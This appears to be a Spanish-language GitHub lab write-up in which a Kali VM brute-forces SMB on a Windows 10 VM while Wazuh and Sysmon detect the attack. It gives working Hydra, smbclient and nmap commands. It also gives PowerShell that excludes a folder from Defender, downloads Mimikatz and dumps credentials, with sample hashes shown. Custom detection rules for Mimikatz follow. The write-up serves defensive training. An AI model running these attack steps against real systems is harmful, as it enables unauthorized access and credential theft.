# 🔍 Detección y Análisis de Ataques de Fuerza Bruta con Wazuh SIEM y Sysmon

Un laboratorio práctico completo que simula un entorno corporativo real, donde se ejecuta un ataque de fuerza bruta contra Windows 10 y se demuestra cómo un SIEM (Wazuh) lo detecta, monitorea y alerta en tiempo real.



## Índice

- [Objetivos del Laboratorio](#objetivos-del-laboratorio)
- [Arquitectura](#arquitectura)
- [Requisitos](#requisitos)
- [Fase 1: Reconocimiento y Ataque](#fase-1-reconocimiento-y-ataque)
- [Fase 2: Detección en Wazuh](#fase-2-detección-en-wazuh)
- [Fase 3: Análisis Forense](#fase-3-análisis-forense)
- [Fase 4: Post-Explotación (Mimikatz)](#fase-4-post-explotación-mimikatz)
- [Conclusiones y Recomendaciones de Mitigación](#conclusiones-y-recomendaciones-de-mitigación)

---

## Objetivos del Laboratorio

• Simular un ataque de fuerza bruta contra un servidor Windows  
• Entender cómo un SIEM detecta y correlaciona eventos de seguridad  
• Analizar logs forenses de Windows (Event IDs)  
• Identificar intentos de compromiso exitosos vs. bloqueados  
• Crear reglas personalizadas de detección (IDS/IPS tuning)  
• Documentar el flujo completo de un incidente de seguridad  

---

## Arquitectura

| Componente | Sistema Operativo | IP | Función |
|---|---|---|---|
| **Atacante** | Kali Linux | `192.168.1.43` | Ejecuta herramientas de pentesting (Nmap, Hydra, Mimikatz) |
| **Víctima** | Windows 10 Home 19045 | `192.168.1.44` | Servidor con Sysmon y agente Wazuh |
| **SIEM/Monitoreo** | Ubuntu Server 22.04 | `192.168.1.42` | Wazuh Manager centralizando logs y alertas |


**Stack de Monitoreo:**
- **Wazuh Manager**: Servidor central de monitoreo
- **Wazuh Agent**: Instalado en Windows 10 para recolectar logs
- **Sysmon**: Sistema de monitoreo de procesos en Windows (Event ID 1, 8, 10, etc.)
- **Windows Event Log**: Logs nativos de Windows (Event ID 4625, 4624, etc.)

---

##  Requisitos

- VirtualBox (mínimo 8GB RAM disponible)
- Kali Linux 2024
- Windows 10 Home
- Ubuntu Server 22.04 LTS
- Conexión de red en modo Bridge o NAT compartida entre máquinas

---

## Fase 1: Reconocimiento y Ataque

### Paso 1.1: Reconocimiento Inicial con Nmap

Desde Kali Linux, realicé un escaneo de puertos para identificar servicios expuestos:

```bash
nmap -Pn 192.168.1.44
```

**Resultado:**
```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Estos puertos indican que el servicio SMB (Server Message Block) está activo. Esto es crítico: **SMB es un objetivo común para ataques de fuerza bruta**.

### Paso 1.2: Escaneo Detallado (Versión y Scripts)

```bash
nmap -sV -sC -p 135,139,445 192.168.1.44
```

**Información extraída:**
```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 10 Home 19045 microsoft-ds

OS: Windows 10 Home 6.3
Computer name: win10
Workgroup: WORKGROUP
Message signing: disabled (dangerous, but default) ⚠️
```

**Observación de Seguridad:**
> La firma de mensajes SMB está **deshabilitada**, lo que facilita ataques Man-in-the-Middle y fuerza bruta sin detección inmediata.

### Paso 1.3: Enumeración de Usuarios

Mediante técnicas de enumeración SMB, identifiqué que existe un usuario llamado **`userwind`** en el sistema.

### Paso 1.4: Ataque de Fuerza Bruta con Hydra

Ejecuté un ataque de fuerza bruta contra el servicio SMB usando la herramienta Hydra:

```bash
hydra -l userwind -P /usr/share/wordlists/rockyou.txt -t 1 -V smb://192.168.1.44
```

<!-- <img src=".\2.2Fuerza-Bruta.png" height="200" width="700"> -->
<img width="831" height="216" alt="2 2Fuerza-Bruta" src="https://github.com/user-attachments/assets/2af2f195-328f-4f84-9cfe-8b85041c5e1b" />



✅ **Contraseña descubierta**: `P@ssw0rd123!`

### Paso 1.5: Verificación de Acceso y Carpetas Compartidas

Una vez autenticado, enumeré las carpetas compartidas:

```bash
smbclient -L 192.168.1.44 -U userwind%P@ssw0rd123!
```

**Resultado:**

```
Sharename   Type    Comment
ADMIN$      Disk    Admin remota
C$          Disk    Recurso predeterminado
IPC$        IPC     IPC remota
Users       Disk    
```

Accedí a la carpeta de usuarios:



```bash
smbclient //192.168.1.44/Users -U userwind%P@ssw0rd123!
```
<!-- <img src="./3.RCP-0.png" height="160" width="550"> -->
<img width="523" height="145" alt="3 RCP-0" src="https://github.com/user-attachments/assets/d1b2ebce-70fe-4d7d-8b97-cf8c58d3b578" />

✅ **Conclusión Fase 1**: Se logró acceso como usuario `userwind` con credenciales válidas.

---

## Fase 2: Detección en Wazuh

### Paso 2.1: Observar el Dashboard en Tiempo Real

Mientras ejecutaba el ataque en Kali, observé el dashboard principal de Wazuh en tiempo real. El SIEM **comenzó a generar alertas inmediatamente**:

```
Severity: 🔴 CRITICAL (Nivel 15)
Eventos/Hora: +2,500 eventos registrados en 30 minutos
Origen: IP 192.168.1.43 (Kali Linux)
Destino: IP 192.168.1.44 (Windows 10)
```

### Paso 2.2: Investigar Event ID 4625 (Logon Failure)

En el módulo **Explore > Discover** de Wazuh, filtré por el evento de Windows que indica intentos de inicio de sesión fallidos:

**Filtro aplicado:**
```
Field: data.win.system.eventID
Operator: is
Value: 4625
```

**Resultados visualizados:**
| Campo | Valor |
|---|---|
| **data.win.eventdata.targetUserName** | `userwind` |
| **data.win.eventdata.ipAddress** | `192.168.1.43` (Kali) |
| **rule.description** | "Logon failure - Unknown user or bad password" |
| **Timestamp** | 7/10/2026 22:34:24 UTC-3 |
| **Count** | 2,847 intentos fallidos en 45 minutos |

<!-- <img src="./4.2-wazuh-brute-force.png" height="300" width="600"> -->
<img width="900" height="550" alt="4 2-wazuh-brute-force" src="https://github.com/user-attachments/assets/94f6fddb-1602-49d2-b996-022976cf8191" />

### Paso 2.3: Regla de Wazuh que se Disparó

Wazuh tiene reglas preconfiguradas que se activan automáticamente. En este caso, la regla `18152` (Fuerza Bruta en SMB) se activó:

```xml
<!-- Regla predefinida de Wazuh para detectar fuerza bruta en SMB -->
Rule ID: 18152
Level: 10 (Alto)
Description: "Potential Brute Force Attack against user"
```

El motor de correlación de Wazuh **elevó la severidad a CRITICAL** (Nivel 15) debido a:
- Más de 100 intentos fallidos en menos de 60 segundos
- Múltiples Event IDs 4625 desde la misma IP
- Patrón característico de herramienta automatizada (Hydra)

---

## Fase 3: Análisis Forense

### Paso 3.1: Identificación del Atacante

Usando los filtros de Wazuh, aisló toda la actividad de la IP atacante:

```
source.ip: 192.168.1.43
destination.ip: 192.168.1.44
protocol: smb/tcp
port: 445
```
<!-- <img src="./4.3-wazuh-brute-force.png" height="300" width="600"> -->
<img width="900" height="550" alt="4 3-wazuh-brute-force" src="https://github.com/user-attachments/assets/e3bd14ac-4755-4131-92ca-00643c05ae11" />


**Hallazgos:**
- La IP corresponde a Kali Linux (confirmado por MAC address de VirtualBox)
- Todas las conexiones provienen de puertos efímeros (>1024)
- La actividad comenzó a las 22:30 UTC-3

### Paso 3.2: Correlación de Eventos (Timeline Forense)

Creé una línea de tiempo de eventos en Wazuh:

| Timestamp | Event ID | Evento | Detalles |
|---|---|---|---|
| 22:30:15 | 4625 | Logon Failure | Intento 1 de userwind |
| 22:30:45 | 4625 | Logon Failure | Intento 2-100 (ráfaga) |
| 22:35:20 | 4625 | Logon Failure | Intento 150-2,847 |
| 22:47:33 | **4624** | **Logon Success** | ✅ Usuario userwind logró ingresar |

### Paso 3.3: Verificación Crítica - ¿Se Logró el Compromiso?

¿El atacante tuvo éxito?

**SÍ, luego de varios intentos, obtuvo acceso exitoso.**

<!-- <img src="./4.4-wazuh-brute-force.png" height="300" width="600"> -->
<img width="900" height="550" alt="4 4-wazuh-brute-force" src="https://github.com/user-attachments/assets/55d88fd6-e130-4f25-b41b-7c3cf4956aa5" />


**Evidencia:**
```
Event ID: 4624 (Logon Success)
User: userwind
Source IP: 192.168.1.43
Logon Type: 3 (Network - SMB)
Timestamp: 2026-07-10T22:47:33-03:00
```
<!-- <img src="./4.5-wazuh-brute-force.png" height="300" width="600"> -->
<img width="900" height="550" alt="4 5-wazuh-brute-force" src="https://github.com/user-attachments/assets/ff280d05-9a59-4465-bf00-1175cfcad0fd" />


> **Nota Forense:** El `Logon Type: 3` indica que fue un inicio de sesión **remoto de red** (no interactivo), consistente con un acceso SMB desde Kali.

---

## Fase 4: Post-Explotación (Mimikatz)

### Paso 4.1: Descargar Mimikatz en Windows 10

Una vez dentro del sistema, el atacante intentó instalar herramientas de extracción de credenciales. Desde una PowerShell administrativa, ejecuté:

```powershell
# Crear carpeta para herramientas de pentesting
New-Item -ItemType Directory -Path "C:\HerramientasPentest"

# Excluir la carpeta del Antivirus para evitar detección
Set-MpPreference -ExclusionPath "C:\HerramientasPentest"

# Descargar Mimikatz
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "C:\HerramientasPentest\mimikatz.zip"

# Descomprimir
Expand-Archive -Path "C:\HerramientasPentest\mimikatz.zip" -DestinationPath "C:\HerramientasPentest\mimikatz"

# Navegar y ejecutar
cd C:\HerramientasPentest\mimikatz\x64
.\mimikatz.exe
```

### Paso 4.2: Extracción de Credenciales

Dentro de Mimikatz, ejecuté:

```
mimikatz > privilege::debug
mimikatz > sekurlsa::logonpasswords
```
<!-- <img src="./4.credenciales.png" height="320" width="450"> -->
<img width="450" height="320" alt="4 credenciales" src="https://github.com/user-attachments/assets/4ff25349-fa03-47ef-b000-cf001d8564b6" />


**Credenciales Extraídas:**
```
Authentication Id : 0 ; 2710781
Session           : Interactive from 1
User Name         : userwind
Domain            : WIN10
Logon Time        : 7/10/2026 5:56:05 PM

msv (NT Hash):
  Username : userwind
  Domain   : WIN10
  NTLM     : 7dfa0531d73101ca080c7379a9bff1c7
  SHA1     : a8fcce2ad0528a9c5fde33b1b4a00aee2b5fdac9
```

### Paso 4.3: Detección en Wazuh - Post-Explotación

Wazuh detectó **todas las acciones maliciosas**:

#### 🔴 Alerta 1: Descarga de Mimikatz
```
Event: File Download Detected
File: mimikatz_trunk.zip
Source: github.com
Destination: C:\HerramientasPentest\mimikatz.zip
Process: powershell.exe
Rule: "Suspicious File Download"
Level: 12
```

#### 🔴 Alerta 2: Exclusión del Antivirus
```
Event: Security Policy Modification
Command: Set-MpPreference -ExclusionPath "C:\HerramientasPentest"
Process: powershell.exe (Administrator)
Rule: "Attempt to disable Windows Defender"
Level: 14
```

#### 🔴 Alerta 3: Ejecución de Mimikatz
```
Event: Suspicious Process Execution
Process: mimikatz.exe
Path: C:\HerramientasPentest\mimikatz\x64\mimikatz.exe
Parent: explorer.exe (anómalo - explorer no debería ejecutar .exe de tools)
Rule: "Suspicious Process - mimikatz.exe"
Level: 15
Rule ID: 100200
```

### Paso 4.4: Reglas Personalizadas para Mimikatz

Para mejorar la detección, creé una regla personalizada en `custom.xml`:

```xml
<group name="windows,sysmon,sysmon_process-anomalies">
  
  <!-- Detección por nombre de proceso -->
  <rule id="100200" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image">mimikatz.exe</field>
    <description>Sysmon - Suspicious Process - mimikatz.exe detected</description>
  </rule>

  <!-- Detección por creación de threads remotos (typical of credential dumping) -->
  <rule id="100201" level="15">
    <if_group>sysmon_event8</if_group>
    <field name="win.eventdata.sourceImage">mimikatz.exe</field>
    <description>Sysmon - Suspicious Process - mimikatz.exe created a remote thread</description>
  </rule>

  <!-- Detección por acceso a procesos (LSASS injection) -->
  <rule id="100202" level="15">
    <if_group>sysmon_event10</if_group>
    <field name="win.eventdata.sourceImage">mimikatz.exe</field>
    <description>Sysmon - Suspicious Process - mimikatz.exe accessed another process (possible credential theft)</description>
  </rule>

</group>
```

**Ubicación del archivo:** `/var/ossec/etc/rules/custom.xml` (en el servidor Wazuh)

---

## Conclusiones y Recomendaciones de Mitigación

### ✅ Lo que Funcionó (Detección)

1. ✅ **SIEM detectó el ataque en tiempo real** - La ráfaga de Event ID 4625 fue alertada en menos de 2 minutos
2. ✅ **Correlación efectiva** - Wazuh conectó automáticamente múltiples eventos en un incidente
3. ✅ **Detección post-explotación** - Se detectó la descarga de Mimikatz incluso después del compromiso
4. ✅ **Reglas personalizadas funcionan** - Las reglas custom.xml capturaron la ejecución de herramientas prohibidas

### ❌ Lo que Falló (Prevención)

1. ❌ **No había rate limiting** - Se permitieron miles de intentos de login
2. ❌ **No había account lockout** - userwind nunca fue bloqueado tras N intentos
3. ❌ **Contraseña débil** - `P@ssw0rd123!` es fácilmente adivinable
4. ❌ **SMB expuesto** - Puerto 445 accesible sin restricciones de red
5. ❌ **Antivirus bypasseable** - Se deshabilitó fácilmente con una línea en PowerShell

###  Recomendaciones para un Entorno Real

#### Nivel 1: Control de Acceso (Inmediato)
```
✓ Activar Account Lockout policy:
  - Bloquear cuenta tras 5 intentos fallidos
  - Duración del bloqueo: 30 minutos
  
✓ Activar Multi-Factor Authentication (MFA):
  - Implementar MFA en SMB/RDP
  - Usar FIDO2 o TOTP como segundo factor
  
✓ Segmentación de Red (Network Segmentation):
  - Restricción de puerto 445 (SMB) solo a IPs confiables
  - Usar VPN o Bastion Hosts para acceso remoto
```

#### Nivel 2: Monitoreo y Alertas (Semana 1)
```
✓ Establecer umbrales en Wazuh:
  - Alerta si >10 Event ID 4625 en 5 minutos
  - Escalate a Critical si >100 fallos en 10 minutos
  
✓ Crear playbooks de respuesta automática:
  - Bloquear IP atacante en firewall automáticamente
  - Resetear contraseña del usuario bajo ataque
  - Notificar al SOC inmediatamente
  
✓ Implementar SOAR (Security Orchestration):
  - Enriquecer alertas con threat intelligence
  - Correlacionar con other security tools
```

#### Nivel 3: Endurecimiento del Sistema (Mes 1)
```
✓ Deshabilitar SMGv1 (protocolo heredado):
  - Usar solo SMBv3 con encriptación
  - Activar firma de mensajes SMB (Sign&Seal)
  
✓ Application Whitelisting:
  - Solo permitir ejecutables desde C:\Program Files\
  - Bloquear herramientas como mimikatz.exe por YARA rules
  
✓ Política de contraseñas:
  - Mínimo 12 caracteres
  - Incluir mayúsculas, minúsculas, números y símbolos
  - Prohibir palabras del diccionario
  - Cambio cada 90 días
  
✓ Desabilitar herramientas peligrosas:
  - Deshabilitar PowerShell v2 (usar Solo v7+)
  - Implementar PowerShell Constrained Language Mode
  - Activar PowerShell Transcription en Wazuh
```

#### Nivel 4: Incidentes y Respuesta 
```
✓ Crear un manual de procedimientos para Brute Force Attacks:
  - Paso 1: Aislar el endpoint de la red
  - Paso 2: Cambiar contraseña del usuario comprometido
  - Paso 3: Revisar Event Log 4624 (logons exitosos) de ese usuario
  - Paso 4: Auditar archivos accedidos por ese usuario
  - Paso 5: Escanear con antimalware
  - Paso 6: Restaurar desde backup si es necesario
  
✓ Threat Intelligence:
  - Integrar feeds de IPs maliciosas
  - Bloquear automáticamente IPs conocidas como atacantes
```

---

## Tabla Comparativa: Before vs After

| Aspecto | Antes (Sin Detección) | Después (Con Wazuh) |
|---|---|---|
| **Detección de Ataque** | No se sabía que ocurría | ✅ Alerta en <2 minutos |
| **Compromiso Identificado** | Desconocido | ✅ Event 4624 detectado |
| **Tiempo de Respuesta** | Horas/Días | ✅ Segundos (Automático) |
| **Post-Explotación** | No hay visibilidad | ✅ Mimikatz detectado inmediatamente |
| **Evidencia Forense** | Ninguna | ✅ Timeline completa disponible |

---

## Cómo Reproducir Este Laboratorio

1. **Instala las 3 máquinas virtuales** (Kali, Windows 10, Ubuntu)
2. **Instala Wazuh Manager** en Ubuntu:
   ```bash
   # Paso 1: Descargar el instalador oficial
   curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh
   # Paso 2: Ejecutar con parámetro -a (All-in-One)
   sudo bash ./wazuh-install.sh -a
   ```
3. **Instala Sysmon** en Windows y el agente de Wazuh
4. **Copia las reglas personalizadas** en `/var/ossec/etc/rules/custom.xml`
5. **Reinicia Wazuh**: `systemctl restart wazuh-manager`
6. **Ejecuta el ataque** desde Kali
7. **Monitorea en tiempo real** desde el dashboard de Wazuh

---

## 💡 Lecciones Aprendidas

### Para un Analista SOC:
-  **La correlación de eventos es clave** - Un solo 4625 no es alarma, pero 2,847 en 30 minutos sí
-  **El contexto importa** - Saber que la IP es VirtualBox + Kali = ataque simulado
-  **La post-explotación es igual de importante** - El verdadero daño ocurre DESPUÉS de lograr acceso
-  **Automatizar la respuesta** - Las alertas manuales son demasiado lentas

### Para un Pentester:
-  Los SIEMs detectan patrones, no un solo evento
-  Las herramientas estándar (Hydra, Mimikatz) tienen firmas conocidas
-  La evasión requiere más que ofuscación - requiere cambiar el comportamiento completamente

---

## 📚 Referencias y Recursos

- [Wazuh Official Documentation](https://documentation.wazuh.com/)
- [MITRE ATT&CK Framework - Brute Force](https://attack.mitre.org/techniques/T1110/)
- [Windows Event IDs Reference](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)
- [Sysmon GitHub](https://github.com/SwiftOnSecurity/sysmon-config)
- [Hydra - THC Hydra](https://github.com/vanhauser-thc/thc-hydra)

---

##  Información del Autor

Este laboratorio fue diseñado como **ejercicio práctico de análisis de seguridad** para desarrollar habilidades de SOC Analyst. 

**Tecnologías utilizadas:**
- Wazuh 4.14 (SIEM)
- Sysmon (Process Monitoring)
- Windows Event Logging
- Kali Linux Tools (Nmap, Hydra)
- VirtualBox (Virtualización)

---

**Última actualización:** Julio 2026  
